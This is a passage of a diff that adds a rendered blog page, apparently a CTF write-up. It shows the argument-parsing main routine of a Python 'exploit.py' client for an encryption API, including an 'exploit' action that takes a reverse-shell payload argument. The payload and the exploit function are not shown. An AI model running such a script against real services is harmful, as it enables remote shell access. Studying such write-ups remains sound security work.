+</span></span><span style="display:flex;"><span>    parser <span style="color:#f92672">=</span> argparse<span style="color:#f92672">.</span>ArgumentParser(description<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;API Client&#39;</span>)
+</span></span><span style="display:flex;"><span>    parser<span style="color:#f92672">.</span>add_argument(<span style="color:#e6db74">&#39;--action&#39;</span>, choices<span style="color:#f92672">=</span>[<span style="color:#e6db74">&#39;register&#39;</span>, <span style="color:#e6db74">&#39;login&#39;</span>, <span style="color:#e6db74">&#39;upload-key&#39;</span>, <span style="color:#e6db74">&#39;encrypt&#39;</span>, <span style="color:#e6db74">&#39;decrypt&#39;</span>, <span style="color:#e6db74">&#39;exploit&#39;</span>, <span style="color:#e6db74">&#39;generate-key&#39;</span>], required<span style="color:#f92672">=</span><span style="color:#66d9ef">True</span>, help<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;Action to perform&#39;</span>)
+</span></span><span style="display:flex;"><span>    parser<span style="color:#f92672">.</span>add_argument(<span style="color:#e6db74">&#39;--pubkey&#39;</span>,  help<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;Path to the public key file&#39;</span>)
+</span></span><span style="display:flex;"><span>    parser<span style="color:#f92672">.</span>add_argument(<span style="color:#e6db74">&#39;--privkey&#39;</span>,  help<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;Path to the private key file&#39;</span>)
+</span></span><span style="display:flex;"><span>    parser<span style="color:#f92672">.</span>add_argument(<span style="color:#e6db74">&#39;--password&#39;</span>, help<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;Password to use if required.&#39;</span>)
+</span></span><span style="display:flex;"><span>    parser<span style="color:#f92672">.</span>add_argument(<span style="color:#e6db74">&#39;--username&#39;</span>, help<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;Username to use if required.&#39;</span>)
+</span></span><span style="display:flex;"><span>    parser<span style="color:#f92672">.</span>add_argument(<span style="color:#e6db74">&#39;--login&#39;</span>, help<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;Login with a username&#39;</span>)
+</span></span><span style="display:flex;"><span>    parser<span style="color:#f92672">.</span>add_argument(<span style="color:#e6db74">&#39;--plaintext&#39;</span>, help<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;Plaintext data to Encrypt.&#39;</span>)
+</span></span><span style="display:flex;"><span>    parser<span style="color:#f92672">.</span>add_argument(<span style="color:#e6db74">&#39;--ciphertext&#39;</span>, help<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;Decrypt ciphertext data.&#39;</span>)
+</span></span><span style="display:flex;"><span>    parser<span style="color:#f92672">.</span>add_argument(<span style="color:#e6db74">&#39;--payload&#39;</span>,help<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;Exploit the API&#39;</span>)
+</span></span><span style="display:flex;"><span>    parser<span style="color:#f92672">.</span>add_argument(<span style="color:#e6db74">&#39;--token&#39;</span>, help<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;Authentication token to provide as a Header as Authorization: </span><span style="color:#e6db74">{token}</span><span style="color:#e6db74"> if required.&#39;</span>)
+</span></span><span style="display:flex;"><span>    parser<span style="color:#f92672">.</span>add_argument(<span style="color:#e6db74">&#39;--kp-name&#39;</span>, help<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;Name of the keypair for generate-key action&#39;</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    args, unknown <span style="color:#f92672">=</span> parser<span style="color:#f92672">.</span>parse_known_args()
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> args<span style="color:#f92672">.</span>action <span style="color:#f92672">in</span> [<span style="color:#e6db74">&#39;register&#39;</span>, <span style="color:#e6db74">&#39;login&#39;</span>]:
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> <span style="color:#f92672">not</span> args<span style="color:#f92672">.</span>username:
+</span></span><span style="display:flex;"><span>            parser<span style="color:#f92672">.</span>error(<span style="color:#e6db74">&#39;--username &lt;username&gt; --password &lt;password&gt; is required for this action.&#39;</span>)
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> <span style="color:#f92672">not</span> args<span style="color:#f92672">.</span>password:
+</span></span><span style="display:flex;"><span>            parser<span style="color:#f92672">.</span>error(<span style="color:#e6db74">&#39;--username &lt;username&gt; --password &lt;password&gt; is required for this action.&#39;</span>)
+</span></span><span style="display:flex;"><span>    
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> args<span style="color:#f92672">.</span>action <span style="color:#f92672">in</span> [<span style="color:#e6db74">&#39;login&#39;</span>, <span style="color:#e6db74">&#39;upload-key&#39;</span>, <span style="color:#e6db74">&#39;encrypt&#39;</span>, <span style="color:#e6db74">&#39;decrypt&#39;</span>]:
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> <span style="color:#f92672">not</span> args<span style="color:#f92672">.</span>token:
+</span></span><span style="display:flex;"><span>            parser<span style="color:#f92672">.</span>error(<span style="color:#e6db74">&#39;--token is required for this action.&#39;</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> args<span style="color:#f92672">.</span>action <span style="color:#f92672">==</span> <span style="color:#e6db74">&#39;upload-key&#39;</span>:
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> <span style="color:#f92672">not</span> args<span style="color:#f92672">.</span>pubkey <span style="color:#f92672">or</span> <span style="color:#f92672">not</span> args<span style="color:#f92672">.</span>privkey:
+</span></span><span style="display:flex;"><span>            parser<span style="color:#f92672">.</span>error(<span style="color:#e6db74">&#39;--pubkey &lt;file&gt; --privkey &lt;file&gt; --token &lt;token&gt; --password &lt;password&gt; are required for this action.&#39;</span>)
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">else</span>:
+</span></span><span style="display:flex;"><span>            upload_key(args<span style="color:#f92672">.</span>token, args<span style="color:#f92672">.</span>password, args<span style="color:#f92672">.</span>pubkey, args<span style="color:#f92672">.</span>privkey)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> args<span style="color:#f92672">.</span>action <span style="color:#f92672">==</span> <span style="color:#e6db74">&#39;encrypt&#39;</span>:
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> <span style="color:#f92672">not</span> args<span style="color:#f92672">.</span>plaintext <span style="color:#f92672">or</span> <span style="color:#f92672">not</span> args<span style="color:#f92672">.</span>pubkey:
+</span></span><span style="display:flex;"><span>            parser<span style="color:#f92672">.</span>error(<span style="color:#e6db74">&#39;--plaintext &lt;plaintext&gt; --pubkey &lt;file&gt; --password &lt;password&gt; --token &lt;token&gt; is required for this action.&#39;</span>)
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">else</span>:
+</span></span><span style="display:flex;"><span>            encrypt(args<span style="color:#f92672">.</span>token, args<span style="color:#f92672">.</span>password, base64<span style="color:#f92672">.</span>urlsafe_b64encode(args<span style="color:#f92672">.</span>plaintext<span style="color:#f92672">.</span>encode())<span style="color:#f92672">.</span>decode(), args<span style="color:#f92672">.</span>pubkey)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> args<span style="color:#f92672">.</span>action <span style="color:#f92672">==</span> <span style="color:#e6db74">&#39;decrypt&#39;</span>:
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> <span style="color:#f92672">not</span> args<span style="color:#f92672">.</span>ciphertext:
+</span></span><span style="display:flex;"><span>            parser<span style="color:#f92672">.</span>error(<span style="color:#e6db74">&#34;--ciphertext &lt;data&gt; --password &lt;password&gt; --username &lt;username&gt; --token &lt;token&gt; is required for the decrypt action.&#34;</span>)
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">else</span>:
+</span></span><span style="display:flex;"><span>            decrypt(args<span style="color:#f92672">.</span>token, args<span style="color:#f92672">.</span>ciphertext, args<span style="color:#f92672">.</span>password)
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> args<span style="color:#f92672">.</span>action <span style="color:#f92672">==</span> <span style="color:#e6db74">&#39;exploit&#39;</span>:
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> <span style="color:#f92672">not</span> args<span style="color:#f92672">.</span>payload:
+</span></span><span style="display:flex;"><span>            parser<span style="color:#f92672">.</span>error(<span style="color:#e6db74">&#34;--payload &lt;Reverse-shell-payload&gt; is required for the exploit action.&#34;</span>)
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">else</span>:
+</span></span><span style="display:flex;"><span>            exploit(args<span style="color:#f92672">.</span>payload)
+</span></span><span style="display:flex;"><span>            print_colored(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;Exploit function called using </span><span style="color:#e6db74">{</span>args<span style="color:#f92672">.</span>payload<span style="color:#e6db74">}</span><span style="color:#e6db74">&#34;</span>, <span style="color:#e6db74">&#39;yellow&#39;</span>)
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> args<span style="color:#f92672">.</span>action <span style="color:#f92672">==</span> <span style="color:#e6db74">&#39;register&#39;</span>:
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> <span style="color:#f92672">not</span> args<span style="color:#f92672">.</span>username <span style="color:#f92672">or</span> <span style="color:#f92672">not</span> args<span style="color:#f92672">.</span>password:
+</span></span><span style="display:flex;"><span>            print_colored(<span style="color:#e6db74">&#34;python3 exploit.py --username &lt;username&gt; --password &lt;password&gt; are required for the register action.&#34;</span>, <span style="color:#e6db74">&#39;red&#39;</span>)
+</span></span><span style="display:flex;"><span>            sys<span style="color:#f92672">.</span>exit(<span style="color:#ae81ff">1</span>)
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">else</span>:
+</span></span><span style="display:flex;"><span>            val <span style="color:#f92672">=</span> register(args<span style="color:#f92672">.</span>username, args<span style="color:#f92672">.</span>password)
+</span></span><span style="display:flex;"><span>            print_colored(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;Registration function called using </span><span style="color:#e6db74">{</span>args<span style="color:#f92672">.</span>username<span style="color:#e6db74">}</span><span style="color:#e6db74">:</span><span style="color:#e6db74">{</span>args<span style="color:#f92672">.</span>password<span style="color:#e6db74">}</span><span style="color:#e6db74">&#34;</span>, <span style="color:#e6db74">&#39;yellow&#39;</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> args<span style="color:#f92672">.</span>action <span style="color:#f92672">==</span> <span style="color:#e6db74">&#39;login&#39;</span>:
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> <span style="color:#f92672">not</span> args<span style="color:#f92672">.</span>username <span style="color:#f92672">or</span> <span style="color:#f92672">not</span> args<span style="color:#f92672">.</span>password:
+</span></span><span style="display:flex;"><span>            print_colored(<span style="color:#e6db74">&#34;python3 exploit.py --token &lt;token&gt; --username &lt;username&gt; --password &lt;password&gt; are required for the login action.&#34;</span>, <span style="color:#e6db74">&#39;red&#39;</span>)
+</span></span><span style="display:flex;"><span>            sys<span style="color:#f92672">.</span>exit(<span style="color:#ae81ff">1</span>)
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">else</span>:
+</span></span><span style="display:flex;"><span>            login(args<span style="color:#f92672">.</span>username, args<span style="color:#f92672">.</span>password, args<span style="color:#f92672">.</span>token)
+</span></span><span style="display:flex;"><span>            print_colored(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;Login function called using </span><span style="color:#e6db74">{</span>args<span style="color:#f92672">.</span>username<span style="color:#e6db74">}</span><span style="color:#e6db74">:</span><span style="color:#e6db74">{</span>args<span style="color:#f92672">.</span>password<span style="color:#e6db74">}</span><span style="color:#e6db74">:</span><span style="color:#e6db74">{</span>args<span style="color:#f92672">.</span>token<span style="color:#e6db74">}</span><span style="color:#e6db74">&#34;</span>, <span style="color:#e6db74">&#39;yellow&#39;</span>)
+</span></span></code></pre></div></div>
+    </article>
+  </main>
+
+      </div>
+      <footer>
+  <hr />
+  
+    <p id="social">
+      Find me around the web:
+      <br />
+      
+        
+        <a href="https://github.com/supaaasuge">GitHub</a>
+      
+         | 
+        <a href="https://x.com/supaaasuge">Twitter</a>
+      
+    </p>
+  
+  <p class="copyright">
+    Copyright © 2024
+    <a href="https://supaaasuge.github.io/"><strong>Supaaasuge</strong></a>.
+    This work is licensed under the
+    <a href="http://creativecommons.org/licenses/by-sa/4.0/">CC BY-SA 4.0</a> license.
+  </p>
+  <p class="builtWith">
+    Built with
+    <a href="http://www.gohugo.io/">Hugo</a>,
+    using the theme
+    <a href="https://gitlab.com/ian-s-mcb/smigle-hugo-theme">smigle</a>,
+    which was influenced by the theme
+    <a href="https://github.com/sumnerevans/smol">smol</a>.
+  </p>
+</footer>
+
+    </div>
+  </body>
+</html>
